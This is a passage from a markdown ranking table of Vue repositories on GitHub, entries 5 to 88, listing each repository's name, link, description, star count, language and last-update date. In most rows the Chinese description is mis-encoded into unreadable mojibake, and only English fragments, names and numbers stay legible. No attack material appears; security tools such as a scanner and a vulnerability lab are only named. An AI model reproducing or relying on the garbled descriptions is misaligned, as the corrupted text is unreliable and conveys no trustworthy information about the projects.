|5|[lyswhut/lx-music-desktop](https://github.com/lyswhut/lx-music-desktop)|‰∏Ä‰∏™Âü∫‰∫é electron ÁöÑÈü≥‰πêËΩØ‰ª∂|8.6k|Vue|10/30|
|6|[macrozheng/mall-admin-web](https://github.com/macrozheng/mall-admin-web)|mall-admin-webÊòØ‰∏Ä‰∏™ÁîµÂïÜÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÁöÑÂâçÁ´ØÈ°πÁõÆÔºåÂü∫‰∫éVue+ElementÂÆûÁé∞„ÄÇ ‰∏ªË¶ÅÂåÖÊã¨ÂïÜÂìÅÁÆ°ÁêÜ„ÄÅËÆ¢ÂçïÁÆ°ÁêÜ„ÄÅ‰ºöÂëòÁÆ°ÁêÜ„ÄÅ‰øÉÈîÄÁÆ°ÁêÜ„ÄÅËøêËê•ÁÆ°ÁêÜ„ÄÅÂÜÖÂÆπÁÆ°ÁêÜ„ÄÅÁªüËÆ°Êä•Ë°®„ÄÅË¥¢Âä°ÁÆ°ÁêÜ„ÄÅÊùÉÈôêÁÆ°ÁêÜ„ÄÅËÆæÁΩÆÁ≠âÂäüËÉΩ„ÄÇ|7.2k|Vue|10/08|
|7|[chuzhixin/vue-admin-beautiful](https://github.com/chuzhixin/vue-admin-beautiful)|üöÄüöÄüöÄvue3.0,vue3,vue3.x,vue.js,ÂêéÂè∞ÁÆ°ÁêÜÔºågithubÂºÄÊ∫êadmin‰∏≠ÊúÄ‰ºòÁßÄÁöÑvue3.0ÈõÜÊàêÊ°ÜÊû∂‰πã‰∏ÄÔºåÂÆÉÊòØÂõΩÂÜÖÈ¶ñ‰∏™Âü∫‰∫évue3.0 + antdvÁöÑÂºÄÊ∫êadminÈ°πÁõÆÔºåÂêåÊó∂ÊîØÊåÅÁîµËÑëÔºåÊâãÊú∫ÔºåÂπ≥ÊùøÔºåüî•üî•üî•vue3.0-antdvÂàÜÊîØ‰ΩøÁî®vue3.xÂºÄÂèëÔºåmasterÂàÜÊîØ‰ΩøÁî®ÁöÑÊòØvue2.xÂºÄÂèë|6.0k|Vue|10/28|
|8|[Hunlongyu/ZY-Player](https://github.com/Hunlongyu/ZY-Player)|‚ñ∂Ô∏è Ë∑®Âπ≥Âè∞Ê°åÈù¢Á´ØËßÜÈ¢ëËµÑÊ∫êÊí≠ÊîæÂô®.ÁÆÄÊ¥ÅÊó†ÂπøÂëä.ÂÖçË¥πÈ´òÈ¢úÂÄº. üéû|5.7k|Vue|10/30|
|9|[chaitin/xray](https://github.com/chaitin/xray)|‰∏ÄÊ¨æÂÆåÂñÑÁöÑÂÆâÂÖ®ËØÑ‰º∞Â∑•ÂÖ∑ÔºåÊîØÊåÅÂ∏∏ËßÅ web ÂÆâÂÖ®ÈóÆÈ¢òÊâ´ÊèèÂíåËá™ÂÆö‰πâ poc   ‰ΩøÁî®‰πãÂâçÂä°ÂøÖÂÖàÈòÖËØªÊñáÊ°£|4.2k|Vue|10/22|
|10|[DataV-Team/DataV](https://github.com/DataV-Team/DataV)|VueÊï∞ÊçÆÂèØËßÜÂåñÁªÑ‰ª∂Â∫ìÔºàÁ±ª‰ººÈòøÈáåDataVÔºåÂ§ßÂ±èÊï∞ÊçÆÂ±ïÁ§∫ÔºâÔºåÊèê‰æõSVGÁöÑËæπÊ°ÜÂèäË£ÖÈ•∞„ÄÅÂõæË°®„ÄÅÊ∞¥‰ΩçÂõæ„ÄÅÈ£ûÁ∫øÂõæÁ≠âÁªÑ‰ª∂ÔºåÁÆÄÂçïÊòìÁî®ÔºåÈïøÊúüÊõ¥Êñ∞(ReactÁâàÂ∑≤ÂèëÂ∏É)|3.6k|Vue|09/09|
|11|[GavinZhuLei/vue-form-making](https://github.com/GavinZhuLei/vue-form-making)|A visual form designer/generator base on Vue.js, make form development simple and efficient.ÔºàÂü∫‰∫éVueÁöÑÂèØËßÜÂåñË°®ÂçïËÆæËÆ°Âô®ÔºåËÆ©Ë°®ÂçïÂºÄÂèëÁÆÄÂçïËÄåÈ´òÊïà„ÄÇÔºâ|3.6k|Vue|09/08|
|12|[herozhou/vue-framework-wz](https://github.com/herozhou/vue-framework-wz)|üëèvueÂêéÂè∞ÁÆ°ÁêÜÊ°ÜÊû∂üëè|3.5k|Vue|04/30|
|13|[mescroll/mescroll](https://github.com/mescroll/mescroll)|Á≤æËá¥ÁöÑ‰∏ãÊãâÂà∑Êñ∞Âíå‰∏äÊãâÂä†ËΩΩ jsÊ°ÜÊû∂.ÊîØÊåÅvue,ÂÆåÁæéËøêË°å‰∫éÁßªÂä®Á´ØÂíå‰∏ªÊµÅPCÊµèËßàÂô® (JS framework for pull-refresh and pull-up-loading)|3.3k|Vue|09/15|
|14|[ustbhuangyi/vue-sell](https://github.com/ustbhuangyi/vue-sell)|:rice: Vue.jsÈ´ò‰ªøÈ•ø‰∫Ü‰πàÂ§ñÂçñAppËØæÁ®ãÊ∫êÁ†Å http://coding.imooc.com/class/74.html|3.3k|Vue|04/20|
|15|[ymm-tech/gods-pen](https://github.com/ymm-tech/gods-pen)|Âü∫‰∫évueÁöÑÈ´òÊâ©Â±ïÂú®Á∫øÁΩëÈ°µÂà∂‰ΩúÂπ≥Âè∞ÔºåÂèØËá™ÂÆö‰πâÁªÑ‰ª∂ÔºåÂèØÊ∑ªÂä†ËÑöÊú¨ÔºåÂèØÊï∞ÊçÆÁªüËÆ°„ÄÇA mobile page builder/editor, similar with amolink. |3.2k|Vue|09/10|
|16|[Heeexy/SpringBoot-Shiro-Vue](https://github.com/Heeexy/SpringBoot-Shiro-Vue)|Êèê‰æõ‰∏ÄÂ•óÂü∫‰∫éSpring Boot-Shiro-VueÁöÑÊùÉÈôêÁÆ°ÁêÜÊÄùË∑Ø.ÂâçÂêéÁ´ØÈÉΩÂä†‰ª•ÊéßÂà∂,ÂÅöÂà∞ÊåâÈíÆ/Êé•Âè£Á∫ßÂà´ÁöÑÊùÉÈôê|3.2k|Vue|09/21|
|17|[wdlhao/vue2-element-touzi-admin](https://github.com/wdlhao/vue2-element-touzi-admin)| Âü∫‰∫évue2.0 +vuex+ element-uiÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü |3.1k|Vue|09/04|
|18|[ZyqGitHub1/h-player-v2](https://github.com/ZyqGitHub1/h-player-v2)|ËµÑÊ∫êÈááÈõÜÁ´ôÂú®Á∫øÊí≠Êîæ|2.9k|Vue|09/10|
|19|[bailichen/vue-weixin](https://github.com/bailichen/vue-weixin)|Vue2 ÂÖ®ÂÆ∂Ê°∂‰ªø ÂæÆ‰ø°App È°πÁõÆÔºåÊîØÊåÅÂ§ö‰∫∫Âú®Á∫øËÅäÂ§©ÂíåÊú∫Âô®‰∫∫ËÅäÂ§©|2.5k|Vue|09/04|
|20|[jdf2e/nutui](https://github.com/jdf2e/nutui)|ËΩªÈáèÁ∫ßÁßªÂä®Á´Ø Vue ÁªÑ‰ª∂Â∫ì (A Vue.js UI Toolkit for Mobile Web)|2.4k|Vue|10/29|
|21|[mgbq/nx-admin](https://github.com/mgbq/nx-admin)| üëç A magical   üêÆ  ‚öî  vue adminÔºåËÆ∞Âæóstar|2.3k|Vue|05/11|
|22|[elunez/eladmin-web](https://github.com/elunez/eladmin-web)|eladminÂâçÁ´ØÊ∫êÁ†ÅÔºåÈ°πÁõÆÂü∫‰∫é Spring Boot 2.1.0 „ÄÅ Spring Boot Jpa„ÄÅ Spring Security„ÄÅRedis„ÄÅVueÁöÑÂâçÂêéÁ´ØÂàÜÁ¶ªÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºå ÊùÉÈôêÊéßÂà∂ÈááÁî® RBACÔºåËèúÂçïÂä®ÊÄÅË∑ØÁî±|2.3k|Vue|10/20|
|23|[lybenson/bilibili-vue](https://github.com/lybenson/bilibili-vue)|ÂâçÁ´Øvue+ÂêéÁ´ØkoaÔºåÂÖ®Ê†àÂºèÂºÄÂèëbilibiliÈ¶ñÈ°µ|2.3k|Vue|09/08|
|24|[JakHuang/form-generator](https://github.com/JakHuang/form-generator)|:sparkles:Element UIË°®ÂçïËÆæËÆ°Âèä‰ª£Á†ÅÁîüÊàêÂô®|2.2k|Vue|10/16|
|25|[febsteam/FEBS-Vue](https://github.com/febsteam/FEBS-Vue)|SpringBootÔºåShiroÔºåJWTÔºåVue & Ant Design ÂâçÂêéÁ´ØÂàÜÁ¶ªÊùÉÈôêÁÆ°ÁêÜÁ≥ªÁªüÔºàÁ≤æÂäõÊúâÈôêÔºåÂÅúÊ≠¢Áª¥Êä§Ôºâ|2.0k|Vue|07/02|
|26|[Exrick/xmall-front](https://github.com/Exrick/xmall-front)|Âü∫‰∫éVueÂºÄÂèëÁöÑXMallÂïÜÂüéÂâçÂè∞È°µÈù¢ PCÁ´Ø|1.9k|Vue|09/05|
|27|[Geek-James/ddBuy](https://github.com/Geek-James/ddBuy)|üéâVueÂÖ®ÂÆ∂Ê°∂+Vant Êê≠Âª∫Â§ßÂûãÂçïÈ°µÈù¢ÁîµÂïÜÈ°πÁõÆ.http://ddbuy.7-orange.cn|1.9k|Vue|09/22|
|28|[halfrost/vue-objccn](https://github.com/halfrost/vue-objccn)|üî• Use Vue.js to develop a cross-platform full stack application / Áî® Vue.js ÂºÄÂèëÁöÑË∑®‰∏âÁ´ØÂ∫îÁî®|1.9k|Vue|08/27|
|29|[open-source-labs/OverVue](https://github.com/open-source-labs/OverVue)|Prototyping Tool For Vue Devs ÈÄÇÁî®‰∫éVueÁöÑÂéüÂûãÂ∑•ÂÖ∑|1.8k|Vue|09/10|
|30|[YanxinNet/uView](https://github.com/YanxinNet/uView)|uView UIÔºåÊòØuni-appÁîüÊÄÅÊúÄ‰ºòÁßÄÁöÑUIÊ°ÜÊû∂ÔºåÂÖ®Èù¢ÁöÑÁªÑ‰ª∂Âíå‰æøÊç∑ÁöÑÂ∑•ÂÖ∑‰ºöËÆ©ÊÇ®‰ø°ÊâãÊãàÊù•ÔºåÂ¶ÇÈ±ºÂæóÊ∞¥|1.8k|Vue|10/25|
|31|[github1586/nuxt-bnhcp](https://github.com/github1586/nuxt-bnhcp)|nuxt„ÄÅexpress„ÄÅvue„ÄÅmysql„ÄÅredis„ÄÅnginx„ÄÅsocket.io (ÂÆûÊàòÂïÜÂüé)|1.8k|Vue|09/11|
|32|[zhaohaodang/vue-WeChat](https://github.com/zhaohaodang/vue-WeChat)|:fire: ‰∏ÄÊ¨æÂü∫‰∫éVue2.0È´ò‰ªøÂæÆ‰ø°AppÁöÑÂçïÈ°µÂ∫îÁî®|1.7k|Vue|09/03|
|33|[TaleLin/lin-cms-vue](https://github.com/TaleLin/lin-cms-vue)| üîÜ Vue+ElementUIÊûÑÂª∫ÁöÑCMSÂºÄÂèëÊ°ÜÊû∂|1.7k|Vue|10/29|
|34|[sunzongzheng/music](https://github.com/sunzongzheng/music)|electronË∑®Âπ≥Âè∞Èü≥‰πêÊí≠ÊîæÂô®ÔºõÂèØÊêúÁΩëÊòì‰∫ë„ÄÅQQÈü≥‰πê„ÄÅËôæÁ±≥Èü≥‰πêÔºõÊîØÊåÅQQ„ÄÅÂæÆÂçö„ÄÅGithubÁôªÂΩïÔºå‰∫ëÊ≠åÂçï; ÊîØÊåÅ‰∏ÄÈîÆÂØºÂÖ•Èü≥‰πêÂπ≥Âè∞Ê≠åÂçï|1.5k|Vue|10/29|
|35|[Sioxas/vue-music](https://github.com/Sioxas/vue-music)|Vue Èü≥‰πêÊêúÁ¥¢„ÄÅÊí≠Êîæ Demo|1.5k|Vue|10/19|
|36|[KuangPF/mpvue-weui](https://github.com/KuangPF/mpvue-weui)|Áî® vue ÂÜôÂ∞èÁ®ãÂ∫èÔºåÂü∫‰∫é mpvue Ê°ÜÊû∂ÈáçÂÜô weui„ÄÇ|1.4k|Vue|09/10|
|37|[0xbug/Hawkeye](https://github.com/0xbug/Hawkeye)|GitHub Ê≥ÑÈú≤ÁõëÊéßÁ≥ªÁªü(GitHub Sensitive Information Leakage Monitor Spider)|1.4k|Vue|10/02|
|38|[a54552239/pearProject](https://github.com/a54552239/pearProject)|pearÔºåÊ¢®Â≠êÔºåËΩªÈáèÁ∫ßÁöÑÂú®Á∫øÈ°πÁõÆ/‰ªªÂä°Âçè‰ΩúÁ≥ªÁªüÔºåËøúÁ®ãÂäûÂÖ¨Âçè‰Ωú|1.4k|Vue|09/08|
|39|[sl1673495/vue-netease-music](https://github.com/sl1673495/vue-netease-music)|üéµ Âü∫‰∫é Vue2„ÄÅVue-CLI3 ÁöÑÈ´ò‰ªøÁΩëÊòì‰∫ë mac ÂÆ¢Êà∑Á´ØÊí≠ÊîæÂô®ÔºàPCÔºâ Online Music Player|1.3k|Vue|09/10|
|40|[GitHub-Laziji/VBlog](https://github.com/GitHub-Laziji/VBlog)|‰ΩøÁî®GitHub API Êê≠Âª∫‰∏Ä‰∏™ÂèØÂä®ÊÄÅÂèëÂ∏ÉÊñáÁ´†ÁöÑÂçöÂÆ¢|1.3k|Vue|05/10|
|41|[dingyong0214/ThorUI-uniapp](https://github.com/dingyong0214/ThorUI-uniapp)|ThorUIÁªÑ‰ª∂Â∫ìÔºåuni-appÈ°πÁõÆ‰ª£Á†ÅÂàÜ‰∫´ÔºåÁªÑ‰ª∂ÊñáÊ°£Âú∞ÂùÄÔºöhttps://thorui.cn/doc/    „ÄÇ    ÊúÄËøëÊõ¥Êñ∞Êó∂Èó¥Ôºö2020-09-02|1.3k|Vue|09/02|
|42|[dcloudio/hello-uniapp](https://github.com/dcloudio/hello-uniapp)|uni-appÊ°ÜÊû∂ÊºîÁ§∫Á§∫‰æã|1.3k|Vue|10/28|
|43|[maomao1996/Vue-mmPlayer](https://github.com/maomao1996/Vue-mmPlayer)|üéµ Âü∫‰∫é Vue ÁöÑÂú®Á∫øÈü≥‰πêÊí≠ÊîæÂô®ÔºàPCÔºâ Online music player|1.3k|Vue|09/17|
|44|[HongqingCao/GitDataV](https://github.com/HongqingCao/GitDataV)|Âü∫‰∫éVueÊ°ÜÊû∂ÊûÑÂª∫ÁöÑgithubÊï∞ÊçÆÂèØËßÜÂåñÂπ≥Âè∞|1.2k|Vue|09/06|
|45|[shfshanyue/Daily-Question](https://github.com/shfshanyue/Daily-Question)|‰∫íËÅîÁΩëÂ§ßÂéÇÂÜÖÊé®ÂèäÂ§ßÂéÇÈù¢ÁªèÊï¥ÁêÜÔºåÂπ∂‰∏îÊØèÂ§©‰∏ÄÈÅìÈù¢ËØïÈ¢òÊé®ÈÄÅ„ÄÇÊØèÂ§©‰∫îÂàÜÈíüÔºåÂçäÂπ¥Â§ßÂéÇ‰∏≠|1.2k|Vue|10/27|
|46|[xiaozhu188/electron-vue-cloud-music](https://github.com/xiaozhu188/electron-vue-cloud-music)|üöÄElectron + Vue ‰ªøÁΩëÊòì‰∫ëÈü≥‰πêwindowsÂÆ¢Êà∑Á´Ø|1.2k|Vue|10/06|
|47|[myide/see](https://github.com/myide/see)|Âü∫‰∫éÂºÄÊ∫êÁªÑ‰ª∂ÔºàInception & SQLAdvisor & SOARÔºâÁöÑSQLÂÆ°Ê†∏&SQL‰ºòÂåñÁöÑWebÂπ≥Âè∞|1.1k|Vue|10/28|
|48|[biaochenxuying/blog-vue-typescript](https://github.com/biaochenxuying/blog-vue-typescript)|vue + typescript + element-ui ÊîØÊåÅ markdown Ê∏≤ÊüìÁöÑÂçöÂÆ¢ÂâçÂè∞Â±ïÁ§∫|1.1k|Vue|09/23|
|49|[jae-jae/Userscript-Plus](https://github.com/jae-jae/Userscript-Plus)|:monkey: Show current site all UserJSÔºåThe easier way to install UserJs for Tampermonkey. ÊòæÁ§∫ÂΩìÂâçÁΩëÁ´ôÁöÑÊâÄÊúâÂèØÁî®TampermonkeyËÑöÊú¨|1.1k|Vue|10/11|
|50|[dongyuanxin/blog](https://github.com/dongyuanxin/blog)|üìö ‰∏ìÊ≥®Web‰∏éÁÆóÊ≥ï|1.0k|Vue|10/21|
|51|[llldddbbb/dbblog](https://github.com/llldddbbb/dbblog)|Âü∫‰∫éSpringBoot2.x+Vue2.x+ElementUI+Iview+Elasticsearch+RabbitMQ+Redis+ShiroÁöÑÂ§öÊ®°ÂùóÂâçÂêéÁ´ØÂàÜÁ¶ªÁöÑÂçöÂÆ¢È°πÁõÆ|988|Vue|09/04|
|52|[chenxuan0000/vue-seamless-scroll](https://github.com/chenxuan0000/vue-seamless-scroll)| :beginner:A simple, seamless scrolling for Vue.js  vueÊó†ÁºùÊªöÂä®component|968|Vue|10/21|
|53|[lavyun/vue-demo-kugou](https://github.com/lavyun/vue-demo-kugou)|ÈÖ∑Áãówebapp demo(vue2.0+vue-router+vuex)|950|Vue|09/05|
|54|[loveRandy/vue-cli3.0-vueadmin](https://github.com/loveRandy/vue-cli3.0-vueadmin)|Âü∫‰∫évue-cli3.0+vue+elementUI+vuex+axios+ÊùÉÈôêÁÆ°ÁêÜÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü|937|Vue|09/10|
|55|[eshengsky/iBlog](https://github.com/eshengsky/iBlog)|Âü∫‰∫é Node.js ÁöÑÂºÄÊ∫ê‰∏™‰∫∫ÂçöÂÆ¢Á≥ªÁªüÔºåÈááÁî® Nuxt + Vue + TypeScript ÊäÄÊúØÊ†à„ÄÇ|922|Vue|09/19|
|56|[fofapro/vulfocus](https://github.com/fofapro/vulfocus)|üöÄVulfocus ÊòØ‰∏Ä‰∏™ÊºèÊ¥ûÈõÜÊàêÂπ≥Âè∞ÔºåÂ∞ÜÊºèÊ¥ûÁéØÂ¢É docker ÈïúÂÉèÔºåÊîæÂÖ•Âç≥ÂèØ‰ΩøÁî®ÔºåÂºÄÁÆ±Âç≥Áî®„ÄÇ|898|Vue|09/04|
|57|[IFmiss/vue-music](https://github.com/IFmiss/vue-music)|Âü∫‰∫évue2.0ÁöÑÁΩëÊòì‰∫ëÈü≥‰πêÊí≠ÊîæÂô®ÔºåapiÊù•Ëá™‰∫éNeteaseCloudMusicApiÔºåv2.0‰∏∫ÊúÄÊñ∞ÁâàÊú¨|845|Vue|09/05|
|58|[Mynameisfwk/vivo-shop](https://github.com/Mynameisfwk/vivo-shop)|Âü∫‰∫évue2.0ÂÆûÁé∞ÁöÑvivoÁßªÂä®Á´ØÂïÜÂüé(vue+vuex-ruoter+vue-axios+webpack)|840|Vue|09/30|
|59|[dcloudio/uni-ui](https://github.com/dcloudio/uni-ui)|Âü∫‰∫éuni-appÁöÑuiÊ°ÜÊû∂|802|Vue|10/29|
|60|[lss5270/vue-admin-spa](https://github.com/lss5270/vue-admin-spa)|Âü∫‰∫évue2.0ÁîüÊÄÅÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÊ®°ÊùøÔºàspaÔºâ„ÄÇ a vue management system template based on Ôºövue2.0 + vue-router + vuex + element-ui +ES6+ webpack + npm„ÄÇ|762|Vue|09/04|
|61|[geekape/geek-navigation](https://github.com/geekape/geek-navigation)|‚ù§Ô∏è ÊûÅÂÆ¢ÁåøÊ¢¶ÂØºËà™ÔºçÁã¨Á´ãÂºÄÂèëËÄÖÁöÑÂØºËà™Á´ôÔºÅ|762|Vue|09/13|
|62|[inoutcode/ethereum_book](https://github.com/inoutcode/ethereum_book)|Á≤æÈÄö‰ª•Â§™Âùä Ôºà‰∏≠ÊñáÁâàÔºâ|725|Vue|07/04|
|63|[zhengguorong/h5maker](https://github.com/zhengguorong/h5maker)|h5ÁºñËæëÂô®Á±ª‰ººmaka„ÄÅÊòì‰ºÅÁßÄ Ë¥¶Âè∑/ÂØÜÁ†ÅÔºöadmin|716|Vue|08/05|
|64|[fengT-T/996_list](https://github.com/fengT-T/996_list)|996 ÂÖ¨Âè∏Â±ïÁ§∫„ÄÅËÆ®ËÆ∫|703|Vue|09/08|
|65|[wuyawei/Vchat](https://github.com/wuyawei/Vchat)|üíòüç¶üôàVchat ‚Äî ‰ªéÂ§¥Âà∞ËÑöÔºåÊí∏‰∏Ä‰∏™Á§æ‰∫§ËÅäÂ§©Á≥ªÁªüÔºàvue + node + mongodbÔºâ|686|Vue|09/07|
|66|[jsososo/NeteaseMusic](https://github.com/jsososo/NeteaseMusic)|ÁΩëÊòì‰∫ëÈü≥‰πê & QQÈü≥‰πê & Âí™ÂíïÈü≥‰πê Á¨¨‰∏âÊñπ webÁ´Ø (ÂèØÊí≠Êîæ vip„ÄÅ‰∏ãÊû∂Ê≠åÊõ≤)|681|Vue|10/23|
|67|[shuiRong/VueCnodeJS](https://github.com/shuiRong/VueCnodeJS)|‚öΩÔ∏èüéâVueÂàù/‰∏≠Á∫ßÈ°πÁõÆÔºåCnodeJSÁ§æÂå∫ÈáçÊûÑ„ÄÇ( a junior project of Vue.js, rewrite cnodejs.org ) È¢ÑËßà(DEMO)Ôºö|680|Vue|07/12|
|68|[bxm0927/vue-meituan](https://github.com/bxm0927/vue-meituan)|:hamburger: :meat_on_bone: :fork_and_knife:  Âü∫‰∫éVue ÂÖ®ÂÆ∂Ê°∂ (2.x)Âà∂‰ΩúÁöÑÁæéÂõ¢Â§ñÂçñAPP |668|Vue|04/23|
|69|[topfullstack/node-vue-moba](https://github.com/topfullstack/node-vue-moba)|Node.js (Express.js) + Vue.js (Element UI) ÂÖ®Ê†àÂºÄÂèëÁéãËÄÖËç£ËÄÄÊâãÊú∫Á´ØÂÆòÁΩëÂíåÁÆ°ÁêÜÂêéÂè∞|660|Vue|09/08|
|70|[fy0/Icarus](https://github.com/fy0/Icarus)|üïäÔ∏è An opensource community/forum project write with python3 aiohttp and vue.js. ‰∏Ä‰∏™ÂºÄÊ∫êÁöÑÁ§æÂå∫Á®ãÂ∫èÔºå‰∏¥Êó∂ÊµãËØïÁ´ôÔºöhttps://t.myrpg.cn|637|Vue|10/28|
|71|[shfshanyue/blog](https://github.com/shfshanyue/blog)|Âú®ËøôÈáåÂÜô‰∏Ä‰∫õÂ∑•‰Ωú‰∏≠ÈÅáÂà∞ÁöÑÂâçÁ´ØÔºåÂêéÁ´Ø‰ª•ÂèäËøêÁª¥ÁöÑÈóÆÈ¢ò|620|Vue|10/27|
|72|[Exrick/xboot-front](https://github.com/Exrick/xboot-front)|Âü∫‰∫éVue+iView AdminÂºÄÂèëÁöÑXBootÂâçÂêéÁ´ØÂàÜÁ¶ªÂºÄÊîæÂπ≥Âè∞ÂâçÁ´Ø ÊùÉÈôêÂèØÊéßÂà∂Ëá≥ÊåâÈíÆÊòæÁ§∫ Âä®ÊÄÅË∑ØÁî±ÊùÉÈôêËèúÂçï/Â§öËØ≠Ë®Ä/ÁÆÄÊ¥ÅÁæéËßÇ ÂâçÂêéÁ´ØÂàÜÁ¶ª|615|Vue|10/30|
|73|[vincentSea/vue-webapp](https://github.com/vincentSea/vue-webapp)|Ego ÁßªÂä®Á´ØË¥≠Áâ©ÂïÜÂüé (vue+vuex-ruoter+webpack)|599|Vue|06/03|
|74|[dream2023/vue-ele-form](https://github.com/dream2023/vue-ele-form)|Âü∫‰∫éelement-uiÁöÑÊï∞ÊçÆÈ©±Âä®Ë°®ÂçïÁªÑ‰ª∂|570|Vue|10/23|
|75|[stavyan/TinyShop-UniApp](https://github.com/stavyan/TinyShop-UniApp)|Âü∫‰∫é RageFrame2 ÁöÑ‰∏ÄÊ¨æÂÖçË¥πÂºÄÊ∫êÁöÑÂü∫Á°ÄÂïÜÂüéÈîÄÂîÆÂäüËÉΩÁöÑÂºÄÊ∫êÂæÆÂïÜÂüé„ÄÇ|563|Vue|10/19|
|76|[heyui/heyui-admin](https://github.com/heyui/heyui-admin)|Âü∫‰∫é vue Âíå heyui ÁªÑ‰ª∂Â∫ìÁöÑ‰∏≠ÂêéÁ´ØÁ≥ªÁªü https://admin.heyui.top|561|Vue|09/10|
|77|[FatDong1/vue-blog](https://github.com/FatDong1/vue-blog)|üî• Vue.js+Node.js+MongodbÁöÑÂâçÂêéÁ´ØÂàÜÁ¶ªÁöÑ‰∏™‰∫∫ÂçöÂÆ¢|555|Vue|10/03|
|78|[lfyfly/vue-waterfall-easy](https://github.com/lfyfly/vue-waterfall-easy)|vueÁÄëÂ∏ÉÊµÅÁªÑ‰ª∂(vue-waterfall-easy 2.x)|542|Vue|09/04|
|79|[F-loat/ithome-lite](https://github.com/F-loat/ithome-lite)|ü•õ IT‰πãÂÆ∂Á¨¨‰∏âÊñπÂ∞èÁ®ãÂ∫èÁâàÂÆ¢Êà∑Á´ØÔºà‰ΩøÁî® mpvue ÂºÄÂèëÔºåÂÖºÂÆπ webÔºâ|535|Vue|09/05|
|80|[Awheat/vue2-douban-market](https://github.com/Awheat/vue2-douban-market)|ËøôÊòØÂü∫‰∫évue2 + vue-router2 + vuex + axios ‰ªø(Ë±ÜÁì£Â∏ÇÈõÜ)ÁöÑ‰∏Ä‰∏™webappÈ°πÁõÆÔºÅ|525|Vue|05/19|
|81|[mohuishou/scuplus-wechat](https://github.com/mohuishou/scuplus-wechat)|WeÂ∑ùÂ§ßÂ∞èÁ®ãÂ∫è[scuplus] ‰ΩøÁî®wepyÂºÄÂèëÁöÑÂÆåÂñÑÁöÑÊ†°Âõ≠ÁªºÂêàÂ∞èÁ®ãÂ∫è, 40+È°µÈù¢ÔºåÂâçÂêéÁ´ØÂºÄÊ∫êÔºåÂåÖÊã¨ÊàêÁª©„ÄÅËØæË°®„ÄÅÂ§±Áâ©ÊãõÈ¢Ü„ÄÅÂõæ‰π¶È¶Ü„ÄÅÊñ∞ÈóªËµÑËÆØÁ≠âÁ≠âÂ∏∏ËßÅÊ†°Âõ≠Âú∫ÊôØÂäüËÉΩ|523|Vue|06/03|
|82|[xugaoyi/vuepress-theme-vdoing](https://github.com/xugaoyi/vuepress-theme-vdoing)|üöÄ‰∏ÄÊ¨æÁÆÄÊ¥ÅÈ´òÊïàÁöÑVuePress Áü•ËØÜÁÆ°ÁêÜ&ÂçöÂÆ¢(blog) ‰∏ªÈ¢ò|504|Vue|10/29|
|83|[wangy8961/flask-vuejs-madblog](https://github.com/wangy8961/flask-vuejs-madblog)|Âü∫‰∫é Flask Âíå Vue.js ÂâçÂêéÁ´ØÂàÜÁ¶ªÁöÑÂæÆÂûãÂçöÂÆ¢È°πÁõÆÔºåÊîØÊåÅÂ§öÁî®Êà∑„ÄÅMarkdownÊñáÁ´†ÔºàÂñúÊ¨¢/Êî∂ËóèÊñáÁ´†Ôºâ„ÄÅÁ≤â‰∏ùÂÖ≥Ê≥®„ÄÅÁî®Êà∑ËØÑËÆ∫ÔºàÁÇπËµûÔºâ„ÄÅÂä®ÊÄÅÈÄöÁü•„ÄÅÁ´ôÂÜÖÁßÅ‰ø°„ÄÅÈªëÂêçÂçï„ÄÅÈÇÆ‰ª∂ÊîØÊåÅ„ÄÅÁÆ°ÁêÜÂêéÂè∞„ÄÅÊùÉÈôêÁÆ°ÁêÜ„ÄÅRQ‰ªªÂä°ÈòüÂàó„ÄÅElasticsearchÂÖ®ÊñáÊêúÁ¥¢„ÄÅLinux VPSÈÉ®ÁΩ≤„ÄÅDockerÂÆπÂô®ÈÉ®ÁΩ≤Á≠â|504|Vue|02/20|
|84|[WeBankFinTech/fes.js](https://github.com/WeBankFinTech/fes.js)|Fes.js ÊòØ‰∏ÄÂ•ó‰ºòÁßÄÁöÑ‰∏≠ÂêéÂè∞ÂâçÁ´ØËß£ÂÜ≥ÊñπÊ°à„ÄÇÊèê‰æõÂàùÂßãÈ°πÁõÆ„ÄÅÂºÄÂèëË∞ÉËØï„ÄÅMockÊé•Âè£„ÄÅÁºñËØëÊâìÂåÖÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑„ÄÇÂÜÖÁΩÆÂ∏ÉÂ±Ä„ÄÅÊùÉÈôê„ÄÅÊï∞ÊçÆÂ≠óÂÖ∏„ÄÅÁä∂ÊÄÅÁÆ°ÁêÜ„ÄÅÂ≠òÂÇ®„ÄÅApiÁ≠âÂ§ö‰∏™Ê®°Âùó„ÄÇ‰ª•Á∫¶ÂÆö„ÄÅÈÖçÁΩÆÂåñ„ÄÅÁªÑ‰ª∂ÂåñÁöÑËÆæËÆ°ÊÄùÊÉ≥ÔºåËÆ©Áî®Êà∑‰ªÖ‰ªÖÂÖ≥ÂøÉÁî®ÁªÑ‰ª∂Êê≠Âª∫È°µÈù¢ÂÜÖÂÆπ„ÄÇÂü∫‰∫éVue.jsÔºå‰∏äÊâãÁÆÄÂçï„ÄÇÁªèËøáÂ§ö‰∏™È°πÁõÆ‰∏≠ÊâìÁ£®ÔºåË∂ã‰∫éÁ®≥ÂÆö„ÄÇ|497|Vue|10/27|
|85|[x2rr/funds](https://github.com/x2rr/funds)|Ëá™ÈÄâÂü∫ÈáëÂä©ÊâãÊòØ‰∏ÄÊ¨æChromeÊâ©Â±ïÔºåÁî®Êù•Âø´ÈÄüËé∑ÂèñÂÖ≥Ê≥®Âü∫ÈáëÁöÑÂÆûÊó∂Êï∞ÊçÆÔºåÊü•ÁúãËá™ÈÄâÂü∫ÈáëÁöÑÂÆûÊó∂‰º∞ÂÄºÊÉÖÂÜµ|495|Vue|10/29|
|86|[snowlyg/IrisAdminApi](https://github.com/snowlyg/IrisAdminApi)|iris Ê°ÜÊû∂ÁöÑÂêéÂè∞apiÈ°πÁõÆ|485|Vue|10/27|
|87|[zhaotoday/iview](https://github.com/zhaotoday/iview)|admin template based on Vue CLI 3 & iView. Âü∫‰∫é Vue CLI 3 + iView ÁöÑ Vue.js ÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü„ÄÇ|481|Vue|07/04|
|88|[mafengwo/vue-drag-tree-table](https://github.com/mafengwo/vue-drag-tree-table)|vue ÂèØ‰ª•ÊãñÊãΩÊéíÂ∫èÁöÑÊ†ëÂΩ¢Ë°®Ê†º|447|Vue|09/09|
